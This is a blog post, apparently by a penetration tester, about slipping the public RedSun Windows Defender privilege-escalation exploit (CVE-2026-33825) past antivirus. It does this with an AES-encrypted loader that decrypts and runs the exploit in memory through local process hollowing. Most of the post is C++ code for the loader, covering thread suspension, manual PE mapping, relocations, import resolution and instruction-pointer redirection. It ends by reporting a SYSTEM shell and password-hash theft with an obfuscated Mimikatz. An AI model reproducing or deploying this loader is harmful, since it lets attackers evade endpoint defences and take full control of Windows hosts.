---
layout: post
title: "Bypass Native Malicious PE Static Detection with Local Hollowing"
subtitle: "There's lots to learn!"
date: 2026-05-12
tags: [CyberSec]
---

# Bypass Native Malicious PE Static Detection with Local Hollowing

## There's lots to learn!

Posted on May 12, 2026

# Bypass Native Malicious PE Static Detection with Local Hollowing

## Context - What is RedSun (CVE-2026-33825)?

During a penetration test engagement, I exploited **CVE-2026-33825**, also known as **RedSun** - a Local Privilege Escalation vulnerability affecting Microsoft Windows Defender's cloud file rollback mechanism.

The vulnerability allows a low-privileged user to escalate to **SYSTEM** by:

- Abusing Defender's file rollback mechanism for cloud-tagged files.
- Crafting a scenario involving **opportunistic locks** and **NTFS junction abuse** to coerce Defender into writing attacker-controlled content to a privileged path.
- Hijacking the **Storage Tiers Management Engine COM object** (`TieringEngineService.exe`) to redirect the write into `C:\Windows\System32`.

Because Defender runs as SYSTEM, the overwritten binary is later executed in a fully elevated context - granting SYSTEM shell access from a standard user account.

The public PoC for RedSun is available at: [https://github.com/Nightmare-Eclipse/RedSun](https://github.com/Nightmare-Eclipse/RedSun)

The problem? **Dropping the raw RedSun.exe on disk is immediately flagged by Windows Defender and most AV engines**, precisely because it is what triggers Defender's remediation in the first place - Defender would simply delete it before it can run.

---

## The Problem - Static PE Detection

Most Endpoint Detection & Response (EDR) and Antivirus (AV) solutions maintain a **signature database** that matches byte patterns in PE (Portable Executable) files on disk. When a known-malicious executable like RedSun is written to disk:

1. The on-access scanner intercepts the write.
2. It hashes the file or matches byte sequences against known signatures.
3. The file is quarantined or deleted before execution.

This is **static detection** - the file is flagged purely by its on-disk representation, before it ever runs.

To successfully deliver the RedSun PoC, we need to ensure **no recognisable byte pattern of the original binary ever touches the disk in cleartext**.

<img width="997" height="702" alt="image" src="https://github.com/user-attachments/assets/1c55a70a-193f-44be-9a8b-99a4d1b187d6" />


---

## The Solution - Local Hollowing with AES Encryption

**Local Process Hollowing** (also referred to as *self-injection* hollowing) is a technique where a process loads a secondary PE image into its own memory space - hollowing itself out and replacing its execution context with the injected payload - without ever writing the decrypted payload to disk.

The approach used here:

1. **Embed** the RedSun.exe binary inside the loader, AES-encrypted.
2. At runtime, **create a secondary thread** that immediately **suspends the main thread**.
3. The secondary thread **decrypts** the AES-encrypted payload fully in memory.
4. It **manually maps** the decrypted PE into the current process address space:
    - Map PE headers
    - Map all sections
    - Apply base relocations (fixups)
    - Resolve and load imports
5. **Redirect the main thread's instruction pointer** to the entry point of the mapped payload.
6. **Resume the main thread**, which now executes the decrypted RedSun entry point - never written to disk.

The resulting loader binary (`HarryPotter.exe`) contains only AES ciphertext - no identifiable RedSun signatures - and decrypts and executes entirely in memory.

---

## Implementation

### Entry Point - `main()`

The loader's `main` function is deliberately minimal. Its only job is to:

- Obtain a **real handle** to the main thread (not just the pseudo-handle `GetCurrentThread()` returns).
- Spawn a second thread to execute `Doit()`, passing the real handle.
- Wait for `Doit()` to finish.

```cpp
/*
 * Function: main
 * Purpose:
 *  - Duplicates the current thread handle.
 *  - Creates a new thread to execute "Doit".
 *  - Waits for the thread execution to complete.
 */

int main() {

    // Get a pseudo-handle to the current thread, the main thread.
    HANDLE pseudoHandle = GetCurrentThread();
    HANDLE realHandle;

    // Duplicate the pseudo-handle to get a real handle with the same access rights
    if (!DuplicateHandle(GetCurrentProcess(), pseudoHandle, GetCurrentProcess(), &realHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
        printf("[-] Failed to duplicate handle.\n");
        return 1;
    }

    // Create a new thread that executes "Doit" function with the duplicated main thread handle "realHandle"
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Doit, &realHandle, 0, NULL);
    
    // Wait for the "Doit" function to finish execution
    WaitForSingleObject(thread, INFINITE);

    // Cleanup: Close thread and handle
    CloseHandle(thread);
    CloseHandle(realHandle);

    return 0;

}
```

> **Why duplicate the pseudo-handle?**  
> `GetCurrentThread()` returns a pseudo-handle - a constant value that is only meaningful within the calling thread itself. To pass the main thread handle to another thread (`Doit`) and suspend it from there, we need a **real, transferable handle**. `DuplicateHandle` achieves this.

<img width="989" height="424" alt="image" src="https://github.com/user-attachments/assets/f00c413d-7789-48eb-a42c-d2cd1c295c78" />


---

### Hollowing Thread - `Doit()`

The `Doit` function receives the real main thread handle and carries out the full hollowing sequence.

#### Step 1 - Suspend the Main Thread

```cpp
SuspendThread(mainThreadHandle);
```

The main thread is suspended immediately so it cannot execute any further instructions while the payload is being mapped. This ensures the entry point redirect will take effect cleanly.

#### Step 2 - Decrypt the AES Payload

The encrypted RedSun blob is embedded as a byte array in the loader. AES decryption (e.g., AES-256-CBC) is performed in memory:

```cpp
AES_decrypt(encryptedPayload, encryptedSize, aesKey, aesIV, &decryptedBuffer, &decryptedSize);
```

At this point, `decryptedBuffer` holds a valid PE image - the original RedSun.exe - purely in memory.

#### Step 3 - Allocate Memory for the Mapped Image

Read the PE headers to determine the required virtual size and preferred base address:

```cpp
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)decryptedBuffer;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(decryptedBuffer + dosHeader->e_lfanew);

LPVOID imageBase = VirtualAlloc(
    (LPVOID)ntHeaders->OptionalHeader.ImageBase,
    ntHeaders->OptionalHeader.SizeOfImage,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

If the preferred base is unavailable, `VirtualAlloc` returns a different address and relocations must be applied accordingly.


#### Step 4 - Map Headers and Sections

Copy the PE headers:

```cpp
memcpy(imageBase, decryptedBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
```

Then iterate over each section and copy it to its correct virtual address:

```cpp
PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
    LPVOID dest = (LPVOID)((ULONG_PTR)imageBase + section->VirtualAddress);
    LPVOID src  = (LPVOID)((ULONG_PTR)decryptedBuffer + section->PointerToRawData);
    memcpy(dest, src, section->SizeOfRawData);
}
```

#### Step 5 - Apply Base Relocations

If the image was not loaded at its preferred base, each relocation entry must be patched. The delta between the actual base and the preferred base is computed and applied:

```cpp
ULONG_PTR delta = (ULONG_PTR)imageBase - ntHeaders->OptionalHeader.ImageBase;

// Walk the .reloc section and patch each absolute address
PIMAGE_BASE_RELOCATION reloc = /* pointer to .reloc section */;
while (reloc->VirtualAddress) {
    ULONG_PTR *patch = (ULONG_PTR *)((ULONG_PTR)imageBase + reloc->VirtualAddress + offset);
    *patch += delta;
    // advance...
}
```

<img width="1386" height="781" alt="image" src="https://github.com/user-attachments/assets/893e2373-5a99-4351-82d5-39affb9e109f" />

#### Step 6 - Resolve Imports

Walk the Import Directory Table and resolve each imported function via `LoadLibrary` / `GetProcAddress`:

```cpp
PIMAGE_IMPORT_DESCRIPTOR importDesc = /* pointer to import directory */;
while (importDesc->Name) {
    HMODULE lib = LoadLibraryA((LPCSTR)((ULONG_PTR)imageBase + importDesc->Name));
    // Walk thunk and patch each IAT entry with the resolved address
    ...
    importDesc++;
}
```

#### Step 7 - Redirect Main Thread Entry Point and Resume

With the image fully mapped and imports resolved, set the main thread's instruction pointer to the payload's entry point via `SetThreadContext`:

```cpp
CONTEXT ctx = { 0 };
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(mainThreadHandle, &ctx);

// On x64, RCX holds the first argument; RIP is the instruction pointer
ctx.Rcx = (DWORD64)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
ctx.Rip = ctx.Rcx;

SetThreadContext(mainThreadHandle, &ctx);
ResumeThread(mainThreadHandle);
```

The main thread resumes execution at the RedSun entry point - fully mapped, fully resolved, entirely in memory.

<img width="1388" height="679" alt="image" src="https://github.com/user-attachments/assets/55b9fdf3-1730-46e6-bb53-70dbe5e716e1" />


---

## Execution Flow Summary

```
main()
  │
  ├─ GetCurrentThread()          → pseudo-handle
  ├─ DuplicateHandle()           → real handle to main thread
  ├─ CreateThread(Doit)          → secondary thread spawned
  │
  └─ WaitForSingleObject()       → blocks until Doit finishes

Doit()
  │
  ├─ SuspendThread(mainThread)   → pause main thread
  ├─ AES Decrypt(encryptedBlob)  → RedSun.exe in memory
  ├─ VirtualAlloc()              → allocate space for image
  ├─ Map Headers + Sections      → PE layout in memory
  ├─ Apply Relocations           → fix absolute addresses
  ├─ Resolve Imports             → patch IAT via LoadLibrary
  ├─ SetThreadContext(RIP → EP)  → redirect main thread to EP
  └─ ResumeThread(mainThread)    → RedSun executes as SYSTEM
```

---

## Result

The loader (`HarryPotter.exe`) was delivered to the target host. On execution:

- The AES-encrypted payload was decrypted in memory.
- RedSun was mapped and executed entirely without writing the decrypted binary to disk.
- Windows Defender detected the **EICAR test file** used as the bait to trigger the cloud rollback mechanism - exactly as the exploit intends.
- A new `conhost.exe` shell was spawned as **NT AUTHORITY\SYSTEM** (SID S-1-5-18).
- From the SYSTEM shell, local password hashes were extracted using an obfuscated Mimikatz build, confirming full host compromise.

![EICAR triggering Defender and spawning Admin cmd-line](./assets/redsun_evidence.png)

---

## Key Takeaways

- **Static detection** operates on the on-disk PE representation. If the bytes on disk are AES ciphertext, there is no signature to match.
- **Local Hollowing** keeps the decrypted payload entirely in memory - no temp files, no disk writes of the plaintext PE.
- **Manual PE mapping** is a foundational offensive skill: understanding headers, sections, relocations, and the IAT is essential for any in-memory execution technique.
- The `DuplicateHandle` + `SuspendThread` + `SetThreadContext` pattern is a clean way to redirect a process's own execution without spawning a new, detectable child process.

---

## References

- RedSun PoC - [https://github.com/Nightmare-Eclipse/RedSun](https://github.com/Nightmare-Eclipse/RedSun)
- MSRC - CVE-2026-33825 - [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33825](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33825)
- Picus Security - BlueHammer & RedSun Explained
- MITRE ATT&CK - [T1055: Process Injection](https://attack.mitre.org/techniques/T1055/)
- MITRE ATT&CK - [T1574: Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)
- MITRE ATT&CK - [T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)
- Microsoft PE Format Reference - [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- Certified Evasion Techniques Professional (CETP)

Tags: [CyberSec](https://im0s.com/tags#CyberSec)
